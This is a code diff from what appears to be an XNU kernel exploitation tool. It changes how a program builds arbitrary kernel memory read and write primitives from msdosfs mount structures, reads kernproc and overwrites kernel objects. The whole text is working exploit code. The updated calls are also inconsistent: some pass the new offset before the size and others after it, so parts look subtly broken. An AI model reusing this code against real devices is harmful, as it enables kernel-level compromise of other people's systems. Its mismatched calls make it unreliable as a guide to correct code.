@@ -131,9 +131,9 @@ int main(int argc, const char* argv[]) {
     capture_msdosfs_mount_pair(&worker_addr, &worker_allocator, &helper_addr, &helper_allocator);
     
     char worker_data_backup[TYPE_MSDOSFSMOUNT_SIZE];
-    xe_kmem_read(worker_data_backup, worker_addr, sizeof(worker_data_backup));
+    xe_kmem_read(worker_data_backup, worker_addr, 0, sizeof(worker_data_backup));
     char helper_data_backup[TYPE_MSDOSFSMOUNT_SIZE];
-    xe_kmem_read(helper_data_backup, helper_addr, sizeof(helper_data_backup));
+    xe_kmem_read(helper_data_backup, helper_addr, 0, sizeof(helper_data_backup));
     
     char temp_dir[PATH_MAX] = "/tmp/xe_kmem_XXXXXXX";
     xe_assert(mkdtemp(temp_dir) != NULL);
@@ -147,7 +147,7 @@ int main(int argc, const char* argv[]) {
     int helper_bridge_fd = open(path, O_CREAT | O_RDWR);
     xe_assert(helper_bridge_fd >= 0);
     
-    uintptr_t kernproc = xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_KERNPROC_ADDR));
+    uintptr_t kernproc = xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_KERNPROC_ADDR), 0);
     uintptr_t proc = xe_xnu_proc_current_proc();
     
     uintptr_t worker_bridge_vnode;
@@ -159,19 +159,19 @@ int main(int argc, const char* argv[]) {
     xe_assert_err(error);
     
     struct kmem_msdosfs_init_args args;
-    xe_kmem_read(args.worker_data, worker_addr, sizeof(args.worker_data));
+    xe_kmem_read(args.worker_data, worker_addr, sizeof(args.worker_data), 0);
     args.worker_msdosfs = worker_addr;
     args.worker_bridge_fd = worker_bridge_fd;
     args.worker_bridge_vnode = worker_bridge_vnode;
     xe_allocator_msdosfs_get_mountpoint(worker_allocator, args.worker_mount_point, sizeof(args.worker_mount_point));
     
-    xe_kmem_read(args.helper_data, helper_addr, sizeof(args.helper_data));
+    xe_kmem_read(args.helper_data, helper_addr, sizeof(args.helper_data), 0);
     args.helper_msdosfs = helper_addr;
     args.helper_bridge_fd = helper_bridge_fd;
     args.helper_bridge_vnode = helper_bridge_vnode;
     xe_allocator_msdosfs_get_mountpoint(helper_allocator, args.helper_mount_point, sizeof(args.helper_mount_point));
     args.helper_mutator = ^(void* ctx, char data[TYPE_MSDOSFSMOUNT_SIZE]) {
-        xe_kmem_write(helper_addr, data, TYPE_MSDOSFSMOUNT_SIZE);
+        xe_kmem_write(helper_addr, 0, data, TYPE_MSDOSFSMOUNT_SIZE);
     };
     args.helper_mutator_ctx = NULL;
     
@@ -191,8 +191,8 @@ int main(int argc, const char* argv[]) {
     int32_t* pm_sync_incomplete_helper = (int32_t*)(helper_data_backup + TYPE_MSDOSFSMOUNT_MEM_PM_SYNC_INCOMPLETE_OFFSET);
     *pm_sync_incomplete_helper = 1;
     
-    xe_kmem_write(worker_addr, worker_data_backup, sizeof(worker_data_backup));
-    xe_kmem_write(helper_addr, helper_data_backup, sizeof(helper_data_backup));
+    xe_kmem_write(worker_addr, 0, worker_data_backup, sizeof(worker_data_backup));
+    xe_kmem_write(helper_addr, 0, helper_data_backup, sizeof(helper_data_backup));
     
     xe_allocator_msdosfs_destroy(&worker_allocator);
     xe_allocator_msdosfs_destroy(&helper_allocator);
